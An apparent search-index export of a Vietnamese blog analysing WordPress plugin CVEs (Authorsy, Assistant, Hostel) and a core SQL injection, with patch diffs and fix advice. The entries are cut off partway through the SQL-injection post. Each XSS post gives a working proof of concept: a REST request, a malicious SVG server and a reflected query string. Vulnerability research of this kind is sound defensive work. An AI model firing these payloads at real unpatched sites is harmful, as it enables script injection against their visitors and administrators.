Affected Versions: \u003c= 1.0.5 CVSS severity: Medium (6.5) OWASP Top 10: A1: Broken Access Control Required Privilege: Subscriber Trong mô tả yêu cầu đặc quyền Subscriber nhưng thực ra có thể khai thác Unauthenticated. ","date":"2025-10-04","objectID":"/vi/posts/2025-10-04-cve-2025-27006/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/vi/posts/2025-10-04-cve-2025-27006/#"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Authorsy: v1.0.5(vul) và v1.0.6(fix) diff tool: meld hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version ","date":"2025-10-04","objectID":"/vi/posts/2025-10-04-cve-2025-27006/:1:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/vi/posts/2025-10-04-cve-2025-27006/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\rỨng dụng có chức năng tùy chỉnh CSS, lưu dữ liệu trong wp_options và chèn trực tiếp vào \u003cstyle\u003e trên trang. Tuy nhiên, người dùng có thể tương tác với API để chỉnh sửa dữ liệu CSS mà không bị kiểm soát quyền, dẫn đến nguy cơ Broken Access Control và có thể XSS nếu chèn payload độc hại. ","date":"2025-10-04","objectID":"/vi/posts/2025-10-04-cve-2025-27006/:2:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/vi/posts/2025-10-04-cve-2025-27006/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch Diff\rDùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá. Có sự khác biệt rõ ở 2 file core/settings/api-settings.php và core/enqueue-inline/enqueue-inline.php Diff showing changes in enqueue-inline.php to sanitize custom CSS Diff showing REST API permission callback changes in api-settings.php ","date":"2025-10-04","objectID":"/vi/posts/2025-10-04-cve-2025-27006/:2:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/vi/posts/2025-10-04-cve-2025-27006/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-10-04","objectID":"/vi/posts/2025-10-04-cve-2025-27006/:3:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/vi/posts/2025-10-04-cve-2025-27006/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Detect XSS\rGửi POST request đến /wp-json/authorsy/v1/settings với XSS payload: POST /wp-json/authorsy/v1/settings HTTP/1.1 Host: localhost Content-Type: application/json { \"primary_color\":\"\u003c/style\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e\u003cstyle\u003e\" } Ta đóng thẻ \u003cstyle\u003e (CSS trong head) và inject thêm thẻ \u003cscript\u003e chứa XSS payload. Truy cập một trang bất kỳ. XSS payload injected via custom CSS 👉 XSS thành công, inspect để xem code được thay đổi như nào. \u003cstyle\u003e :root { --ea-color-main: \u003c/style\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e\u003cstyle\u003e; } \u003c/style\u003e ","date":"2025-10-04","objectID":"/vi/posts/2025-10-04-cve-2025-27006/:3:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/vi/posts/2025-10-04-cve-2025-27006/#detect-xss"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rLỗ hổng CVE-2025-27006 trong plugin Authorsy \u003c= 1.0.5 là một ví dụ điển hình về Broken Access Control kết hợp với XSS. Nguyên nhân chính là: REST API không kiểm soát quyền truy cập: bất kỳ user nào cũng có thể gọi /wp-json/authorsy/v1/settings để thay đổi các option. CSS tùy chỉnh chưa được sanitize: giá trị CSS được chèn trực tiếp vào \u003cstyle\u003e trong \u003chead\u003e, cho phép kẻ tấn công inject payload \u003cscript\u003e thông qua CSS. Nonce không được xử lý đúng: verify_nonce chỉ trả về WP_Error mà không ngăn code thực thi, khiến việc kiểm tra bảo mật gần như vô hiệu. Key takeaways: REST API cần kiểm soát quyền: luôn sử dụng permission_callback hợp lý để ngăn Broken Access Control. Sanitize dữ liệu người dùng trước khi render trong HTML/CSS/JS để phòng XSS. ","date":"2025-10-04","objectID":"/vi/posts/2025-10-04-cve-2025-27006/:4:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/vi/posts/2025-10-04-cve-2025-27006/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rCross-site scripting (XSS) cheat sheet WordPress Authorsy Plugin \u003c= 1.0.5 is vulnerable to Cross Site Scripting (XSS) ","date":"2025-10-04","objectID":"/vi/posts/2025-10-04-cve-2025-27006/:5:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/vi/posts/2025-10-04-cve-2025-27006/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress Assistant Plugin.","date":"2025-10-03","objectID":"/vi/posts/2025-10-03-cve-2025-53307/","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/vi/posts/2025-10-03-cve-2025-53307/"},{"categories":["CVE Analyst"],"collections":null,"content":"Lỗ hổng xảy ra trên plugin Assistant của WordPress trước phiên bản 3.6.2. Điều này có thể cho phép kẻ tấn công chèn mã độc (ví dụ: script chuyển hướng, quảng cáo, hoặc các payload HTML khác) vào website, và những mã đó sẽ được thực thi khi khách truy cập mở trang. CVE ID: CVE-2025-53307 Product: WordPress Assistant Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 1.5.2 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated ","date":"2025-10-03","objectID":"/vi/posts/2025-10-03-cve-2025-53307/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/vi/posts/2025-10-03-cve-2025-53307/#"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Assistant: v1.5.2(vul) và v1.5.3(fix) diff tool: meld hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version ","date":"2025-10-03","objectID":"/vi/posts/2025-10-03-cve-2025-53307/:1:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/vi/posts/2025-10-03-cve-2025-53307/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\rỨng dụng hiển thị trực tiếp nội dung hình ảnh do người dùng cung cấp thông qua URL mà không xác thực và kiểm tra đầy đủ MIME type. Điều này dẫn đến việc kẻ tấn công có thể cung cấp một tập tin giả dạng hình ảnh và khi được trình duyệt xử lý, nó sẽ thực thi mã độc =\u003e gây ra lỗ hổng XSS. ","date":"2025-10-03","objectID":"/vi/posts/2025-10-03-cve-2025-53307/:2:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/vi/posts/2025-10-03-cve-2025-53307/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch Diff\rDùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá. Diff giữa bản lỗi và bản vá Trong trường hợp này, sự khác biệt giữa 2 phiên bản khá nhiều, để thuận lợi cho việc truy vết, ta có thể xem change log để biết bản vá lỗ hổng XSS ở đâu: Changelog 1.5.3 ( 2025-09-08 ) - Changes to support the integration of Assistant in Beaver Builder version 2.10 - Fixed dark mode issues on the Home app and sidebar. - Security: Fixed a potential XSS vulnerability in the \"image proxy\" 👉 Lỗ hỗng nằm trong file backend/src/Hooks/ImageProxy.php, ta quan sát sự khác biệt của 2 phiên bản: Sự khác biệt trong hàm render_image của ImageProxy.php Sự thay đổi xảy ra ở hàm render_image với chức năng: Nhận tham số url từ query string ($_GET['url']). Gửi request từ server đến URL đó để tải nội dung. Chống ssrf bằng wp_safe_remote_get. Nếu nội dung có header Content-Type bắt đầu bằng image/, thì: Gửi lại header Content-Type đó cho client. In (echo) toàn bộ nội dung file ra cho trình duyệt. Trình duyệt hiển thị hình ảnh không phải trực tiếp từ nguồn gốc mà thông qua server WordPress. SVG cũng có Content-Type bắt đầu bằng image/ và có thể chứa mã JavaScript bên trong =\u003e XSS có thể xảy ra. Bản vá đã thêm một lớp kiểm tra MIME type thực sự của file để tránh kịch bản XSS bằng SVG hay file giả mạo. $filesystem = self::filesystem(); $tmpfile = tempnam( '/tmp', 'assistant' ); $filesystem-\u003eput_contents( $tmpfile, $body ); $validimage = wp_get_image_mime( $tmpfile ); $filesystem-\u003edelete( $tmpfile ); if ( ! $validimage ) { return false; } wp_get_image_mime() sử dụng hàm xử lý ảnh nội bộ (dựa trên dữ liệu binary của file) để xác định MIME thực sự. Nếu kết quả không phải là ảnh hợp lệ =\u003e return false. ","date":"2025-10-03","objectID":"/vi/posts/2025-10-03-cve-2025-53307/:2:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/vi/posts/2025-10-03-cve-2025-53307/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"How it work?\rTrong __construct của class ImageProxy, phương thức render_image() được gọi thông qua callback của action hook 'init'. Hook 'init' được thực thi rất sớm trong quá trình load WordPress, sau khi các đối tượng core được khởi tạo nhưng trước khi gửi output ra trình duyệt. render_image chỉ được gọi khi người dùng hiện tại có quyền chỉnh sửa bài viết của người khác và tham số $_GET['fl_asst_image_proxy'] tồn tại. 👉 Khi truy cập /wp-admin/?fl_asst_image_proxy=value1\u0026url=http://yoursite/image-path thì render_image sẽ được gọi và trả về nội dung hình ảnh cho trình duyệt hiển thị. ","date":"2025-10-03","objectID":"/vi/posts/2025-10-03-cve-2025-53307/:2:2","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/vi/posts/2025-10-03-cve-2025-53307/#how-it-work"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-10-03","objectID":"/vi/posts/2025-10-03-cve-2025-53307/:3:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/vi/posts/2025-10-03-cve-2025-53307/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Detect XSS\rTạo 1 trang web đơn giản trả về nội dung SVG chứa XSS payload from flask import Flask, Response app = Flask(__name__) @app.route('/') def home(): return 'Hello, World!' @app.route('/svg') def about(): svg = \"\"\"\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003csvg xmlns=\"http://www.w3.org/2000/svg\"\u003e \u003cscript\u003ealert(document.domain)\u003c/script\u003e \u003c/svg\u003e\"\"\" return Response(svg, mimetype=\"image/svg+xml\") Gửi request chứa url param trỏ đến https://yoursite/svg http://localhost/wp-admin/?fl_asst_image_proxy=abc\u0026url=https://yoursite/svg 👉 Thành công với Unauthenticated vì chỉ cần người dùng có quyền, khi truy cập url =\u003e XSS xảy ra trên trình duyệt của nạn nhân. Attacker không cần đăng nhập. SVG chứa XSS payload được hiển thị qua image proxy ","date":"2025-10-03","objectID":"/vi/posts/2025-10-03-cve-2025-53307/:3:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/vi/posts/2025-10-03-cve-2025-53307/#detect-xss"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rLỗ hổng CVE-2025-53307 trong plugin WordPress Assistant (\u003c= v1.5.2) cho phép XSS thông qua render_image() vì không kiểm tra MIME type thực của file. Bản vá v1.5.3 đã khắc phục bằng cách xác thực nội dung file trước khi trả về trình duyệt. Key takeaways: Không tin cậy vào Content-Type header từ HTTP response. Luôn xác thực MIME type thực sự của file. ","date":"2025-10-03","objectID":"/vi/posts/2025-10-03-cve-2025-53307/:4:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/vi/posts/2025-10-03-cve-2025-53307/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rCross-site scripting (XSS) cheat sheet WordPress WordPress Assistant Plugin \u003c= 1.5.2 is vulnerable to Cross Site Scripting (XSS) ","date":"2025-10-03","objectID":"/vi/posts/2025-10-03-cve-2025-53307/:5:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/vi/posts/2025-10-03-cve-2025-53307/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress Hostel Plugin.","date":"2025-10-02","objectID":"/vi/posts/2025-10-02-cve-2025-6234/","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/vi/posts/2025-10-02-cve-2025-6234/"},{"categories":["CVE Analyst"],"collections":null,"content":"Lỗ hổng xảy ra trên plugin Hostel của WordPress trước phiên bản 1.1.5.8. Kẻ tấn công có thể lợi dụng lỗ hổng này để tấn công người dùng có quyền cao như admin. CVE ID: CVE-2025-6234 Product: WordPress Hostel Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c 1.1.5.8 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated ","date":"2025-10-02","objectID":"/vi/posts/2025-10-02-cve-2025-6234/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/vi/posts/2025-10-02-cve-2025-6234/#"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Hostel Plugin: v1.1.5.7(vul) và v1.1.5.8(fix) diff tool: meld hoặc bất cứ tool nào có thể compare để tháy được sự khác biệt giữa 2 version ","date":"2025-10-02","objectID":"/vi/posts/2025-10-02-cve-2025-6234/:1:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/vi/posts/2025-10-02-cve-2025-6234/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\rNguyên nhân gốc rễ do không thực hiện sanitize (làm sạch dữ liệu) và escape (mã hóa dữ liệu đầu ra) đối với một tham số trước khi phản hồi lại trên trang, dẫn đến lỗ hổng Reflected Cross-Site Scripting (XSS) ","date":"2025-10-02","objectID":"/vi/posts/2025-10-02-cve-2025-6234/:2:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/vi/posts/2025-10-02-cve-2025-6234/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch Diff\rDùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá. Có sự khác biệt rõ ở 2 file views/bookings.html.php và controllers/bookings.php File views/bookings.html.php \u003cp align=\"center\"\u003e \u003c?php if($offset \u003e 0):?\u003e \u003ca href=\"admin.php?page=wphostel_bookings\u0026type=\u003c?php echo $type?\u003e\u0026offset=\u003c?php echo $offset - $page_limit?\u003e\u0026ob=\u003c?php echo @$_GET['ob']?\u003e\"\u003e\u003c?php _e('[previous page]', 'wphostel')?\u003e\u003c/a\u003e \u003c?php endif;?\u003e \u003c?php if($count \u003e ($page_limit + $offset)):?\u003e \u003ca href=\"admin.php?page=wphostel_bookings\u0026type=\u003c?php echo $type?\u003e\u0026offset=\u003c?php echo $offset + $page_limit?\u003e\u0026ob=\u003c?php echo @$_GET['ob']?\u003e\"\u003e\u003c?php _e('[next page]', 'wphostel')?\u003e\u003c/a\u003e \u003c?php endif;?\u003e \u003c/p\u003e Tham số ob được lấy trực tiếp từ $_GET['ob'] và echo ra HTML attribute mà không có bất kì xử lý escape nào. Điều này dẫn đến nguy cơ Reflected XSS (Cross-Site Scripting), vì attacker có thể chèn payload vào query string, \u003cp align=\"center\"\u003e \u003c?php if($offset \u003e 0):?\u003e \u003ca href=\"admin.php?page=wphostel_bookings\u0026type=\u003c?php echo $type?\u003e\u0026offset=\u003c?php echo $offset - $page_limit?\u003e\u0026ob=\u003c?php echo esc_attr($_GET['ob'] ?? '')?\u003e\"\u003e\u003c?php _e('[previous page]', 'wphostel')?\u003e\u003c/a\u003e \u003c?php endif;?\u003e \u003c?php if($count \u003e ($page_limit + $offset)):?\u003e \u003ca href=\"admin.php?page=wphostel_bookings\u0026type=\u003c?php echo $type?\u003e\u0026offset=\u003c?php echo $offset + $page_limit?\u003e\u0026ob=\u003c?php echo esc_attr($_GET['ob'] ?? '')?\u003e\"\u003e\u003c?php _e('[next page]', 'wphostel')?\u003e\u003c/a\u003e \u003c?php endif;?\u003e \u003c/p\u003e Bản vá đã sử dụng hàm esc_attr() để encode $_GET['ob'] thành dạng an toàn trước khi echo ra HTML attribute. Diff giữa code dễ bị lỗi và code đã vá Source: $_GET['ob'] là dữ liệu nhập từ client (URL query string), attacker có thể kiểm soát hoàn toàn. Sink: echo trong HTML attribute ob=\u003c?php echo @$_GET['ob']?\u003e 👉 Vì source không đi qua logic của controllers nên ta không cần quan tâm diff của controllers/bookings.php ","date":"2025-10-02","objectID":"/vi/posts/2025-10-02-cve-2025-6234/:2:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/vi/posts/2025-10-02-cve-2025-6234/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"How it work?\rĐể $_GET['ob'] được echo ra HTML attribute của thẻ \u003ca\u003e thì điều kiện trong khối if chứa thẻ \u003ca\u003e phải true \u003c?php if($offset \u003e 0):?\u003e // ob=\u003c?php echo @$_GET['ob']?\u003e \u003c?php endif;?\u003e \u003c?php if($count \u003e ($page_limit + $offset)):?\u003e // ob=\u003c?php echo @$_GET['ob']?\u003e \u003c?php endif;?\u003e 👉 Điều kiện quan trọng cần chú ý là if($offset \u003e 0), vì chỉ cần điều kiện này đúng thì XSS đã có thể xảy ra. Không cần quan tâm if($count \u003e ($page_limit + $offset)). File views/bookings.html.php không thể truy cập trực tiếp, mà phải được controllers gọi thông qua hàm include() Biến $offset được controller khởi tạo trước rồi truyền sang view (views/bookings.html.php) để dùng trong mệnh đề if. Để xác định controller nào gọi file view này, ta tìm kiếm biến $offset trong thư mục controllers của plugin. Tìm biến $offset trong thư mục controllers Kết quả cho thấy $offset được tạo trong nhánh default (listing bookings) của hàm tĩnh manage() trong class WPHostelBookings, nằm ở file controllers/bookings.php. Controller Code class WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET['do']) { // other logic // list bookings default: // which bookings to show - upcoming or past? $type = empty($_GET['type']) ? 'upcoming' : sanitize_text_field($_GET['type']); $offset = empty($_GET['offset']) ? 0 : intval($_GET['offset']); $dir = empty($_GET['dir']) ? 'ASC' : $_GET['dir']; if($dir != 'ASC' and $dir != 'DESC') $dir = 'ASC'; $odir = ($dir == 'ASC') ? 'DESC' : 'ASC'; // other logic // define limit (as it's paginated) $page_limit = 20; $limit_sql = empty($_GET['export']) ? $wpdb-\u003eprepare(\"LIMIT %d, %d\", $offset, $page_limit) : ''; // other logic $bookings = $wpdb-\u003eget_results(\"SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \".WPHOSTEL_BOOKINGS.\" tB JOIN \".WPHOSTEL_ROOMS.\" tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\"); $count = $wpdb-\u003eget_var(\"SELECT FOUND_ROWS()\"); // other logic if(@file_exists(get_stylesheet_directory().'/wphostel/bookings.html.php')) include get_stylesheet_directory().'/wphostel/bookings.html.php'; else include(WPHOSTEL_PATH.\"/views/bookings.html.php\"); break; } } } Phân tích biến $offset Biến $offset được khởi tạo từ tham số offset trong URL ($_GET['offset']): Nếu không có tham số =\u003e mặc định 0. Nếu có =\u003e ép kiểu số nguyên bằng intval(). $offset = empty($_GET['offset']) ? 0 : intval($_GET['offset']); Phân tích biến $page_limit $page_limit được đặt cố định là 20, dùng kết hợp với $offset để phân trang: // define limit (as it's paginated) $page_limit = 20; // LIMIT offset, 20 $limit_sql = empty($_GET['export']) ? $wpdb-\u003eprepare(\"LIMIT %d, %d\", $offset, $page_limit) : ''; Khi đó SQL trả về tối đa 20 bản ghi, bắt đầu từ vị trí $offset. Áp dụng vào mệnh đề if: Trong view, đoạn code XSS payload chỉ hiển thị khi: if($offset \u003e 0) =\u003e tức là phải có offset từ 1 trở lên. Muốn offset \u003e 0 có ý nghĩa, cơ sở dữ liệu phải có ít nhất 2 booking. Nếu chỉ có 1 booking thì sau khi bỏ qua 1 dòng (offset=1), không còn dữ liệu nào để hiển thị, nên payload cũng không render ra. 👉 Do đó, để khai thác thành công, cần có tối thiểu 2 booking trong database. Cuối cùng các kết quả được chứa trong các biến sẽ được hiển thị ra views thông qua hàm include() if(@file_exists(get_stylesheet_directory().'/wphostel/bookings.html.php')) include get_stylesheet_directory().'/wphostel/bookings.html.php'; else include(WPHOSTEL_PATH.\"/views/bookings.html.php\"); WPHOSTEL_PATH có thể là hằng global được sử dụng sau khi file PHP chứa nó được load, Để biết được chính xác, ta tìm kiếm với từ khóa WPHOSTEL_PATH. Đường dẫn tuyệt đối tới thư mục plugin ","date":"2025-10-02","objectID":"/vi/posts/2025-10-02-cve-2025-6234/:2:2","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/vi/posts/2025-10-02-cve-2025-6234/#how-it-work"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\rRequest với XSS payload GET /wp-admin/admin.php?page=wphostel_bookings\u0026type=upcoming\u0026offset=1\u0026ob=\"\u003e\u003cimg+src%3D1+onerror%3Dalert%28document.domain%29\u003e HTTP/1.1 Payload thực tế: \"\u003e\u003cimg src=x onerror=alert(document.domain)\u003e Đóng thẻ \u003ca\u003e bằng ký tự \"\u003e. Chèn thêm thẻ \u003cimg\u003e có thuộc tính onerror để kích hoạt JavaScript. Dùng alert(document.domain) thay cho alert(1) như một thói quen, nhằm chứng minh rõ ràng khả năng đọc thông tin từ DOM. Điều này cũng giúp tránh trường hợp Sandbox Domain khiến cho tác động của payload bị xem nhẹ hoặc không có. Kết quả: XSS phản chiếu thành công ","date":"2025-10-02","objectID":"/vi/posts/2025-10-02-cve-2025-6234/:3:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/vi/posts/2025-10-02-cve-2025-6234/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rLỗ hổng CVE-2025-6234 trong plugin WordPress Hostel bắt nguồn từ việc không xử lý đúng dữ liệu đầu vào ($_GET['ob']) trước khi phản hồi lại trên giao diện. Điều này mở ra khả năng cho attacker chèn mã độc Reflected XSS. Bản vá đã khắc phục bằng cách sử dụng hàm esc_attr() để escape dữ liệu trước khi in ra HTML, đảm bảo rằng các giá trị không tin cậy không thể chèn script độc hại. Key takeaways: Luôn sanitize dữ liệu đầu vào và escape dữ liệu đầu ra theo ngữ cảnh (context). Với WordPress, tận dụng các hàm built-in như sanitize_text_field(), esc_attr(), esc_html(), wp_kses()… để giảm thiểu rủi ro bảo mật. ","date":"2025-10-02","objectID":"/vi/posts/2025-10-02-cve-2025-6234/:4:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/vi/posts/2025-10-02-cve-2025-6234/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rXSSCross-site scripting (XSS) cheat sheet - PortSwigger WordPress Hostel Plugin \u003c 1.1.5.8 is vulnerable to Cross Site Scripting (XSS) - patchstack ","date":"2025-10-02","objectID":"/vi/posts/2025-10-02-cve-2025-6234/:5:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/vi/posts/2025-10-02-cve-2025-6234/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress Core.","date":"2025-10-01","objectID":"/vi/posts/2025-10-01-cve-2022-21661/","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/vi/posts/2025-10-01-cve-2022-21661/"},{"categories":["CVE Analyst"],"collections":null,"content":"Do việc làm sạch dữ liệu (sanitization) không đúng cách trong WP_Query, có những trường hợp có thể xảy ra SQL Injection thông qua các plugin hoặc theme sử dụng nó theo một cách nhất định. Lỗ hổng này đã được vá trong WordPress phiên bản 5.8.3. Các phiên bản cũ hơn bị ảnh hưởng cũng đã được sửa thông qua bản phát hành bảo mật, quay ngược lại đến tận phiên bản 3.7.37. CVE ID: CVE-2022-21661 Product: WordPress Vulnerability Type: SQL Injection Affected Versions: 3.7.37 ≤ version \u003c 5.8.3 CVSS severity: High (8.0) ","date":"2025-10-01","objectID":"/vi/posts/2025-10-01-cve-2022-21661/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/vi/posts/2025-10-01-cve-2022-21661/#"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. WordPress: v5.8.2(vul) ","date":"2025-10-01","objectID":"/vi/posts/2025-10-01-cve-2022-21661/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/vi/posts/2025-10-01-cve-2022-21661/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Setup\r","date":"2025-10-01","objectID":"/vi/posts/2025-10-01-cve-2022-21661/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/vi/posts/2025-10-01-cve-2022-21661/#setup"},{"categories":["CVE Analyst"],"collections":null,"content":"Required PHP Version\rWordPress được xây dựng hoàn toàn bằng PHP, vì vậy phiên bản PHP trên máy chủ có ảnh hưởng trực tiếp đến khả năng hoạt động của WordPress: Mỗi phiên bản PHP đều bổ sung tính năng mới và loại bỏ dần các hàm/cú pháp lỗi thời. Nếu WordPress dùng tính năng mới nhưng PHP trên server quá cũ =\u003e sẽ phát sinh lỗi cú pháp (syntax error) hoặc không chạy được. Ngược lại, nếu PHP quá mới, một số hàm cũ mà WordPress vẫn còn sử dụng có thể đã deprecated hoặc bị loại bỏ hoàn toàn, gây lỗi khi chạy. 👉 Do đó, cần lựa chọn phiên bản PHP tương thích với phiên bản WordPress. Trong phân tích này, ta sử dụng PHP 7.4 để cài đặt WordPress 5.8.2. ","date":"2025-10-01","objectID":"/vi/posts/2025-10-01-cve-2022-21661/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/vi/posts/2025-10-01-cve-2022-21661/#required-php-version"},{"categories":["CVE Analyst"],"collections":null,"content":"VSCode Extensions\rWordPress có mã nguồn phức tạp, nên việc đọc từng dòng code thủ công là không khả thi. Để hỗ trợ quá trình debug và truy vết, ta cần cài đặt thêm hai extension sau trong VS Code: PHP Extension Pack =\u003e tìm bằng từ khóa: xdebug.php-pack PHP Tools for VS Code =\u003e tìm bằng từ khóa: devsense.phptools-vscode ","date":"2025-10-01","objectID":"/vi/posts/2025-10-01-cve-2022-21661/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/vi/posts/2025-10-01-cve-2022-21661/#vscode-extensions"},{"categories":["CVE Analyst"],"collections":null,"content":"Custom Plugin\rVì lỗ hổng SQLi này ảnh hưởng đến WordPress Core, nhưng chỉ có thể khai thác gián tiếp thông qua plugin hoặc theme sử dụng WP_Query, nên ta cần thông qua một plugin hoặc theme để tạo tương tác với WP_Query. Ta xây dựng plugin sử dụng WP_Query, hiển thị query được thực thi thông qua WP_Query::request. \u003c?php /** * Plugin Name: Demo WP_Query * Description: Plugin demo WP_Query * Version: 1.0 * Author: w41bu1 */ if (!defined('ABSPATH')) exit; function da_show_posts() { $args = [ 'post_type' =\u003e 'post', 'tax_query' =\u003e [ [ 'taxonomy' =\u003e 'category', 'field' =\u003e 'term_taxonomy_id', 'terms' =\u003e [1,2,3], 'operator' =\u003e 'IN', ], ], ]; $query = new WP_Query($args); ob_start(); echo '\u003ch3\u003eDemo WP_Query\u003c/h3\u003e'; echo '\u003cpre style=\"background:#f0f0f0; padding:15px; width:100%; white-space:pre-wrap; word-wrap:break-word; overflow:auto;\"\u003e'; echo \"SQL query generated by WP_Query:\\n\\n\"; echo esc_html($query-\u003erequest); // Display executed query echo '\u003c/pre\u003e'; if ($query-\u003ehave_posts()) { echo '\u003cul\u003e'; while ($query-\u003ehave_posts()) { $query-\u003ethe_post(); echo '\u003cli\u003e' . get_the_title() . ' (' . get_the_ID() . ')\u003c/li\u003e'; } echo '\u003c/ul\u003e'; } else { echo '\u003cp\u003eNo posts found.\u003c/p\u003e'; } wp_reset_postdata(); return ob_get_clean(); } add_shortcode('demo_wp_query', 'da_show_posts'); Taxonomy parameters Tạo page mới với \u003cpage-title\u003e có shortcode : [demo_wp_query] 👉 Truy vấn sẽ được hiển thị khi truy cập http://localhost/\u003cpage-title\u003e Trang demo hiển thị kết quả WP_Query ","date":"2025-10-01","objectID":"/vi/posts/2025-10-01-cve-2022-21661/:2:3","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/vi/posts/2025-10-01-cve-2022-21661/#custom-plugin"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\rwpdb Là lớp PHP cốt lõi của WordPress dùng để thao tác trực tiếp với MySQL. Cho phép lập trình viên viết và thực thi câu SQL thô. WP_Query Là một lớp trừu tượng hóa giúp lấy dữ liệu bài viết (post) từ database mà không cần viết SQL trực tiếp. Lập trình viên chỉ cần truyền vào mảng tham số (args), WordPress sẽ tự động dựng câu SQL phù hợp. Mối quan hệ WP_Query không trực tiếp truy vấn MySQL. Thay vào đó, nó xây dựng câu SQL dựa trên args, áp dụng các bước kiểm tra/validate, rồi gọi $wpdb để 